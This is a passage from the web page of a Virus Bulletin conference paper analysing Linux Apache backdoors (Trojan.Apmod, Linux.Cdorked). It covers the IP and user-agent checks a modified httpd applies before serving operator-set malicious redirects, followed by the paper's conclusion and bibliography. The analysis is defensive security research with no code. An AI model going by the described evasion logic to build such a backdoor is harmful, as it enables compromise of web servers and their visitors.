type="disc"><li><p>html</p></li><li><p>htm</p></li><li><p>php</p></li><li><p>php4</p></li><li><p>cgi</p></li><li><p>shtml</p></li><li><p>shtm</p></li><li><p>js</p></li></ul></div></li><li><p>The client&rsquo;s IP address is checked against a number of IP address blacklists.</p></li><li><p>The client&rsquo;s user-agent is also matched against an HTTP user-agent blacklist and against a user-agent whitelist. The client&rsquo;s user-agent must appear in this whitelist or the malicious content is not served to the client.</p></li></ol></div><p>Once all the checks have been passed, the modified httpd binary attempts to serve a redirect page to the legitimate user. The server reads this redirect URL from the shared memory segment. The modified server binary does not contain any predefined malicious URLs so they must be set explicitly by a malware operator (controlled through the two-character commands mentioned earlier). The stored URL must conform to a specific format or the server will not attempt to serve the client with malicious content.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4341673"></a>Conclusion</h2></div></div></div><p>With a huge amount of critical infrastructure running on the <span class="emphasis"><em>Linux</em></span> platform, malware authors are presented with enticing opportunities. Coupled with the relaxed attitude taken by most system administrators to the potential of malware infection, <span class="emphasis"><em>Linux</em></span> server infections represent an extremely effective method of virus infection and distribution. A targeted <span class="emphasis"><em>Linux Apache </em></span>server infection ensures a large number of user infections that are also potentially linked by way of geographical location or interest in specific resources and services. Depending on the nature of the infected server&rsquo;s operations, a malware author may be able to leverage large amounts of data on potential end-user infections.</p><p>The continued proliferation of frameworks, front-ends, and web panels, which may remain vulnerable for weeks if not months after exploits are disclosed, only serves to exacerbate the problem. The lax policies of deploying security updates to user accessible services will ensure <span class="emphasis"><em>Linux</em></span> servers remain a viable target for infection. On top of this, even the most security conscious system administrator is still open to attack from the constant threat of zero-day exploits. The recent Heartbleed exploit, while not limited to <span class="emphasis"><em>Linux</em></span> computers, left a huge number of systems vulnerable to exploitation and infection. This type of large-scale vulnerability serves to illustrate the need for constant diligence when maintaining server security. The fallacious argument that &lsquo;<span class="emphasis"><em>Linux</em></span> computers can&rsquo;t get viruses&rsquo; further frustrates efforts to ensure the security of critical infrastructure.</p><p>While Trojan.Apmod and Linux.Cdorked may be relatively unique in their operation and viability, they should serve as an indicator of <span class="emphasis"><em>Linux</em></span> systems&rsquo; vulnerability. Given the increasing number of websites that are hosted on <span class="emphasis"><em>Linux</em></span> computers running the <span class="emphasis"><em>Apache</em></span> web server, and with no anti-virus solution in place, the question becomes: &lsquo;Why wouldn&rsquo;t malware authors target <span class="emphasis"><em>Linux</em></span> aggressively?&rsquo; The pervasive idea that <span class="emphasis"><em>Linux</em></span> systems are immune to viral infection is rapidly becoming a type of argumentum ad populum. As more malware authors recognize the ubiquitous nature of the LAMP infrastructure, coupled with the misconception that <span class="emphasis"><em>Linux</em></span> is inherently secure, we can be confident that malware authors will continue to bite the hand that serves us all.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3426777"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Meuer, H. W.; Strohmaier, E.; Dongarra, J.; Simon, H. Top500 Statistics. November 2013. <span class="bibliosource"><a href="https://www.top500.org/statistics/" target="_blank">http://www.top500.org/statistics/</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Netcraft Web Server Survey. March 2014. <span class="bibliosource"><a href="http://news.netcraft.com/archives/category/web-server-survey/" target="_blank">http://news.netcraft.com/archives/category/web-server-survey/</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Apache Software Foundation. Apache HTTP Server Modules. April 2014. <span class="bibliosource"><a href="https://modules.apache.org/" target="_blank">https://modules.apache.org/</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Apache Software Foundation. Filters &ndash; Apache HTTP Server. April 2014. <span class="bibliosource"><a href="https://httpd.apache.org/docs/2.2/filter.html" target="_blank">http://httpd.apache.org/docs/2.2/filter.html</a></span>.</p></div><div class="bibliomixed"><a id="citation.5"></a><p class="bibliomixed">[5] Mullaney, C. Extending Apache to Serve Malware. May 2011. <span class="bibliosource"><a href="https://www.symantec.com/connect/blogs/extending-apache-serve-malware-0" target="_blank">http://www.symantec.com/connect/blogs/extending-apache-serve-malware-0</a></span>.</p></div><div class="bibliomixed"><a id="citation.6"></a><p class="bibliomixed">[6] Bureau, P.-M. Malicious Apache module Used for Content Injection: Linux/Chapro.A. December 2012. <span class="bibliosource"><a href="http://www.welivesecurity.com/2012/12/18/malicious-apache-module-used-for-content-injection-linuxchapro-a/" target="_blank">http://www.welivesecurity.com/2012/12/18/malicious-apache-module-used-for-content-injection-linuxchapro-a/</a></span>.</p></div><div class="bibliomixed"><a id="citation.7"></a><p class="bibliomixed">[7] Bureau, P.-M. Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. April 2013. <span class="bibliosource"><a href="http://blog.eset.ie/2013/04/29/linuxcdorked-a-new-apache-backdoor-being-used-in-the-wild-to-serve-blackhole/" target="_blank">http://blog.eset.ie/2013/04/29/linuxcdorked-a-new-apache-backdoor-being-used-in-the-wild-to-serve-blackhole/</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/conference/vb2014/VB2014-MullaneyKulkarni.pdf" target="_blank"><img class="ccm-image-block responsive" alt="" src="/uploads/images/buttons/pdf-download-button.jpg" onmouseover="this.src = '/uploads/images/buttons/pdf-download-button-hover.jpg'" onmouseout="this.src = '/uploads/images/buttons/pdf-download-button.jpg'" border="0" height="45" width="262"></a></p>
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=VB2014 paper: Linux-based Apache malware infections: biting the hand that serves us all&url=https://www.virusbulletin.com/virusbulletin/2016/01/paper-linux-based-apache-malware-infections-biting-hand-serves-us-all"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2016/01/paper-linux-based-apache-malware-infections-biting-hand-serves-us-all'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2016/01/paper-linux-based-apache-malware-infections-biting-hand-serves-us-all&title=VB2014 paper: Linux-based Apache malware infections: biting the hand that serves us all"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2016/01/paper-linux-based-apache-malware-infections-biting-hand-serves-us-all&t=VB2014 paper: Linux-based Apache malware infections: biting the hand that serves us all"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2016/01/paper-linux-based-apache-malware-infections-biting-hand-serves-us-all"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>